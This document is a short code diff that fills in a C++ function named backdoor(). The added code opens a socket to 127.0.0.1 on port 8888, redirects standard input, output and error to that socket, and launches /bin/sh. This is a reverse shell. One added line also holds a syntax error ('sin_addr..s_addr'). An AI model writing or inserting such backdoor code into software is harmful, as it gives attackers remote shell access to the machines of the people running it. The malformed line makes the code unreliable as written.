@@ -26,7 +26,21 @@ void backdoor()
     wait(3);
 
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    sockaddr_in addr;
+    sockaddr_in addr{};
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(8888);
+    addr.sin_addr..s_addr = inet_addr("127.0.0.1");
+    
+    
+    
+    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+        // TODO get rid of comments
+        dup2(sockfd, 0);  // stdin
+        dup2(sockfd, 1);  // stdout
+        dup2(sockfd, 2);  // stderr
+        execl("/bin/sh", "sh", nullptr);
+    }
     
     
 }
